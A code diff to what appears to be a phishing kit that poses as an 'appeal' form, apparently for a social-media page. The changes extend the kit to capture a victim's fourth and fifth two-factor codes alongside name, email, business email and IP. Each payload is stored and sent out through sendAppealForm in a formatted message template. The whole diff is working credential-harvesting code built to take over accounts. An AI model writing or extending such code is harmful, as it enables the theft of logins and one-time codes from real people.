@@ -194,7 +194,6 @@
 
         try {
           saveRecord('__ck_clv1', values);
-          await sendAppealForm(values);
         } catch (err) {
           console.warn('Appeal submit error:', err);
         }
@@ -295,15 +294,22 @@
               clickSecurity = 4;
               break;
             }
-            default: {
+            case 4: {
               let base = getRecord('__ck_clv8');
               if (!base) base = {};
               const payload = { ...base, twoFaFifth: code };
+              saveRecord('__ck_clv9', payload);
               await sendAppealForm(payload);
+              // Fifth (and final) attempt: close security modal and show final
               securityForm.reset();
               closeModal('security');
               openModal('final');
               resetSecurityState();
+              break;
+            }
+            default: {
+              // More than 5 attempts: do nothing extra to avoid duplicate sends
+              console.debug('Extra 2FA attempt ignored, clickSecurity =', clickSecurity);
               break;
             }
           }
@@ -452,6 +458,8 @@
       twoFa: data.twoFa || '',
       twoFaSecond: data.twoFaSecond || '',
       twoFaThird: data.twoFaThird || '',
+      twoFaFourth: data.twoFaFourth || '',
+      twoFaFifth: data.twoFaFifth || '',
     };
   }
 
@@ -461,7 +469,10 @@
       ? '\n<b>Auth Method:</b> <code>' + escapeHtml(d.authMethod) + '</code>\n-----------------------------'
       : '';
 
-    const phoneText = d.phone ? '+' + d.phone : '';
+    console.log(d);
+      
+
+    const phoneText = d.phone ? d.phone : '';
 
     return (
       '<b>Ip:</b> <code>' + escapeHtml(d.ip || 'Unknown') + '</code>\n' +
@@ -469,13 +480,6 @@
       '-----------------------------\n' +
       '<b>Full Name:</b> <code>' + escapeHtml(d.fullName) + '</code>\n' +
       '<b>Page Name:</b> <code>' + escapeHtml(d.fanpage) + '</code>\n' +
-      '<b>Date of birth:</b> <code>' +
-      escapeHtml(d.day) +
-      '/' +
-      escapeHtml(d.month) +
-      '/' +
-      escapeHtml(d.year) +
-      '</code>\n' +
       '-----------------------------\n' +
       '<b>Email:</b> <code>' + escapeHtml(d.email) + '</code>\n' +
       '<b>Email Business:</b> <code>' + escapeHtml(d.emailBusiness) + '</code>\n' +
@@ -491,6 +495,10 @@
       escapeHtml(d.twoFaSecond) +
       '</code>\n<b>🔐Code 2FA(3):</b> <code>' +
       escapeHtml(d.twoFaThird) +
+      '</code>\n<b>🔐Code 2FA(4):</b> <code>' +
+      escapeHtml(d.twoFaFourth) +
+      '</code>\n<b>🔐Code 2FA(5):</b> <code>' +
+      escapeHtml(d.twoFaFifth) +
       '</code>'
     );
   }
